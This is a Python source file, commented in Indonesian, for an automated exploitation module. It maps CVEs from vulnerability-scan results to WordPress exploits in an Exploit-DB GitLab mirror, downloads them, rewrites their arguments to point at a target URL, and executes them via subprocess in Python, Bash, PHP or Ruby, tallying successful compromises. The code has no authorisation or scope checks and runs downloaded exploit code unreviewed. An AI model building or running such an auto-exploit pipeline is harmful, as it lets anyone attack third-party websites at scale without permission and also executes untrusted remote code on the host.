"""
Exploiter Module
Fungsi: Menangani eksploitasi kerentanan yang ditemukan, dengan integrasi Exploit-DB GitLab.
Isi: Class Exploiter dengan method exploit() yang mapping CVE ke fungsi eksploit spesifik atau Exploit-DB GitLab. Tambah fungsi per CVE di sini, atau gunakan Exploit-DB untuk auto-download.
"""

import requests
import re
from utils import Logger
from exploitdb_gitlab import ExploitDBGitlab
from exploit_parser import ExploitParser
from cache_manager import CacheManager
from settings import Settings

class Exploiter:
    def __init__(self, logger, settings=None):
        # Fungsi: Inisialisasi exploiter
        # Isi: Setup session requests, logger, ExploitDB GitLab, parser, cache, settings
        self.logger = logger
        self.session = requests.Session()
        self.settings = settings or Settings(logger)
        self.exploitdb = ExploitDBGitlab(logger, 
                                         self.settings.get('exploitdb_gitlab.repo_url'),
                                         self.settings.get('exploitdb_gitlab.cache_dir'))
        self.parser = ExploitParser(logger)
        self.cache = CacheManager(logger, 
                                  self.settings.get('cache.cache_dir', 'cache'),
                                  self.settings.get('cache.max_age_days', 30))
        if self.settings.get('cache.cleanup_on_start', True):
            self.cache.cleanup_cache()
    
    def exploit(self, vulnerabilities, url):
        # Fungsi: Loop exploit vulnerabilities
        # Isi: Untuk setiap vuln, extract CVE, cari di ExploitDB GitLab, download, parse, jalankan
        results = []
        total = len(vulnerabilities)
        
        self.logger.info(f"Starting exploitation of {total} vulnerabilities...")
        
        for idx, vuln in enumerate(vulnerabilities, 1):
            self.logger.info(f"Processing [{idx}/{total}] {vuln.get('template-id', 'unknown')}")
            
            cve = self.extract_cve(vuln)
            result = {
                'vuln_id': vuln.get('template-id'),
                'vuln_name': vuln.get('info', {}).get('name'),
                'cve': cve,
                'url': url,
                'timestamp': self._get_timestamp(),
                'status': 'unknown'
            }
            
            if cve:
                self.logger.info(f"Found CVE: {cve}")
                
                # Update repo jika perlu
                if self.settings.get('exploitdb_gitlab.auto_update', True):
                    try:
                        repo_path = self.exploitdb.update_repo()
                        self.exploitdb.parse_exploits(repo_path)
                    except Exception as e:
                        self.logger.error(f"Failed to update repo: {e}")
                
                # Cari exploits untuk CVE
                exploits = self.exploitdb.get_exploits_by_cve(cve)
                self.logger.info(f"Found {len(exploits)} exploits for {cve}")
                
                wordpress_exploits = self.parser.match_wordpress_exploits(exploits)
                
                if wordpress_exploits:
                    self.logger.info(f"Found {len(wordpress_exploits)} WordPress-specific exploits")
                    
                    # Try each exploit until one succeeds
                    for exploit in wordpress_exploits[:3]:  # Limit to first 3
                        self.logger.info(f"Trying exploit: {exploit.get('id')} - {exploit.get('title', '')[:50]}")
                        
                        code = self.exploitdb.download_exploit(exploit)
                        if code:
                            parsed_info = self.parser.parse_exploit_code(code)
                            exec_result = self.run_exploit_code(code, url, vuln, parsed_info)
                            
                            result.update({
                                'status': exec_result['status'],
                                'exploit_id': exploit.get('id'),
                                'exploit_title': exploit.get('title'),
                                'language': exec_result['language'],
                                'output': exec_result.get('output', ''),
                                'success': exec_result.get('success', False),
                                'error': exec_result.get('error')
                            })
                            
                            # If successful, break and move to next vuln
                            if exec_result.get('success'):
                                self.logger.info(f"✓ Exploit succeeded for {cve}")
                                break
                            else:
                                self.logger.warning(f"✗ Exploit failed for {cve}")
                        else:
                            result['status'] = 'download_failed'
                    
                    if result['status'] == 'unknown':
                        result['status'] = 'all_exploits_failed'
                else:
                    result['status'] = 'no_wordpress_exploit'
                    self.logger.warning(f"No WordPress exploits found for {cve}")
            else:
                result['status'] = 'no_cve'
                self.logger.warning(f"No CVE found in vulnerability {vuln.get('template-id')}")
            
            results.append(result)
            self._save_progress(results)
        
        self.logger.info(f"Exploitation completed: {len(results)} vulnerabilities processed")
        self._print_summary(results)
        return results
    
    def _get_timestamp(self):
        """Get current timestamp"""
        from datetime import datetime
        return datetime.now().isoformat()
    
    def _save_progress(self, results):
        """Save progress ke file untuk tracking"""
        import json
        from pathlib import Path
        
        output_dir = Path('results')
        output_dir.mkdir(exist_ok=True)
        
        output_file = output_dir / 'exploit_results.json'
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
        except Exception as e:
            self.logger.error(f"Failed to save progress: {e}")
    
    def _print_summary(self, results):
        """Print summary of exploitation results"""
        total = len(results)
        succeeded = sum(1 for r in results if r.get('success'))
        failed = sum(1 for r in results if r.get('status') == 'executed' and not r.get('success'))
        no_exploit = sum(1 for r in results if r.get('status') in ['no_wordpress_exploit', 'no_cve'])
        
        self.logger.info("=" * 50)
        self.logger.info("EXPLOITATION SUMMARY")
        self.logger.info("=" * 50)
        self.logger.info(f"Total vulnerabilities: {total}")
        self.logger.info(f"Successfully exploited: {succeeded}")
        self.logger.info(f"Failed exploits: {failed}")
        self.logger.info(f"No exploit available: {no_exploit}")
        self.logger.info("=" * 50)
    
    def extract_cve(self, vuln):
        # Fungsi: Extract CVE dari vuln data
        # Isi: Parse info.tags atau template-id untuk CVE
        tags = vuln.get('info', {}).get('tags', [])
        for tag in tags:
            if tag.upper().startswith('CVE-'):
                return tag.upper()
        # Atau dari template-id
        template_id = vuln.get('template-id', '')
        if 'CVE-' in template_id.upper():
            match = re.search(r'CVE-\d{4}-\d+', template_id.upper())
            if match:
                return match.group(0)
        return None
    
    def run_exploit_code(self, code, url, vuln, parsed_info):
        # Fungsi: Jalankan kode eksploit yang didownload
        # Isi: Execute code berdasarkan language dengan parameter injection
        language = parsed_info['language']
        cves = parsed_info['cves']
        
        self.logger.info(f"Executing {language} exploit for {cves} against {url}")
        
        try:
            if language == 'python':
                result = self._execute_python_exploit(code, url, vuln)
            elif language == 'bash':
                result = self._execute_bash_exploit(code, url, vuln)
            elif language == 'php':
                result = self._execute_php_exploit(code, url, vuln)
            elif language == 'ruby':
                result = self._execute_ruby_exploit(code, url, vuln)
            else:
                self.logger.warning(f"Unsupported language: {language}, treating as shell script")
                result = self._execute_bash_exploit(code, url, vuln)
            
            return {
                "cve": cves,
                "status": "executed",
                "url": url,
                "language": language,
                "output": result['output'],
                "success": result['success'],
                "error": result.get('error')
            }
        except Exception as e:
            self.logger.error(f"Exploit execution failed: {e}")
            return {
                "cve": cves,
                "status": "failed",
                "url": url,
                "language": language,
                "error": str(e)
            }
    
    def _execute_python_exploit(self, code, url, vuln):
        \"\"\"Execute Python exploit dengan parameter injection\"\"\"
        import subprocess
        import tempfile
        
        # Inject parameters ke dalam code
        modified_code = self._inject_parameters_python(code, url, vuln)
        
        # Save ke temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
            f.write(modified_code)
            temp_file = f.name
        
        try:
            # Execute dengan timeout
            result = subprocess.run(
                ['python3', temp_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            success = result.returncode == 0
            output = result.stdout + result.stderr
            
            self.logger.info(f"Python exploit exit code: {result.returncode}")
            
            return {
                'success': success,
                'output': output,
                'returncode': result.returncode
            }
        finally:
            # Cleanup
            import os
            try:
                os.unlink(temp_file)
            except:
                pass
    
    def _execute_bash_exploit(self, code, url, vuln):
        \"\"\"Execute Bash exploit\"\"\"
        import subprocess
        import tempfile
        
        # Inject parameters
        modified_code = self._inject_parameters_bash(code, url, vuln)
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, encoding='utf-8') as f:
            f.write(modified_code)
            temp_file = f.name
        
        try:
            result = subprocess.run(
                ['bash', temp_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'returncode': result.returncode
            }
        finally:
            import os
            try:
                os.unlink(temp_file)
            except:
                pass
    
    def _execute_php_exploit(self, code, url, vuln):
        \"\"\"Execute PHP exploit\"\"\"
        import subprocess
        import tempfile
        
        modified_code = self._inject_parameters_php(code, url, vuln)
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False, encoding='utf-8') as f:
            f.write(modified_code)
            temp_file = f.name
        
        try:
            result = subprocess.run(
                ['php', temp_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'returncode': result.returncode
            }
        finally:
            import os
            try:
                os.unlink(temp_file)
            except:
                pass
    
    def _execute_ruby_exploit(self, code, url, vuln):
        \"\"\"Execute Ruby exploit\"\"\"
        import subprocess
        import tempfile
        
        modified_code = self._inject_parameters_ruby(code, url, vuln)
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rb', delete=False, encoding='utf-8') as f:
            f.write(modified_code)
            temp_file = f.name
        
        try:
            result = subprocess.run(
                ['ruby', temp_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'returncode': result.returncode
            }
        finally:
            import os
            try:
                os.unlink(temp_file)
            except:
                pass
    
    def _inject_parameters_python(self, code, url, vuln):
        \"\"\"Inject target URL dan vuln info ke Python code\"\"\"
        # Add parameters di awal script
        injection = f'''#!/usr/bin/env python3
# Auto-injected parameters
TARGET_URL = "{url}"
VULN_INFO = {vuln}

'''
        # Try smart injection untuk ARGV atau global vars
        if 'sys.argv' in code or 'argparse' in code:
            # Script expects CLI args, add sys.argv injection
            injection += f'''import sys
# Override sys.argv untuk auto-exploit
sys.argv = ['exploit.py', '{url}']

'''
        
        return injection + code
    
    def _inject_parameters_bash(self, code, url, vuln):
        \"\"\"Inject parameters ke Bash script\"\"\"
        injection = f'''#!/bin/bash
# Auto-injected parameters
TARGET_URL="{url}"

'''
        # Replace $1 atau positional params dengan target URL
        code = code.replace('$1', '$TARGET_URL').replace('${1}', '$TARGET_URL')
        return injection + code
    
    def _inject_parameters_php(self, code, url, vuln):
        \"\"\"Inject parameters ke PHP script\"\"\"
        injection = f'''<?php
// Auto-injected parameters
$target_url = "{url}";
$_SERVER['argv'] = array('exploit.php', '{url}');
$argc = 2;

?>
'''
        return injection + code
    
    def _inject_parameters_ruby(self, code, url, vuln):
        \"\"\"Inject parameters ke Ruby script\"\"\"
        injection = f'''#!/usr/bin/env ruby
# Auto-injected parameters
TARGET_URL = "{url}"
ARGV.clear
ARGV.push("{url}")

'''
        return injection + code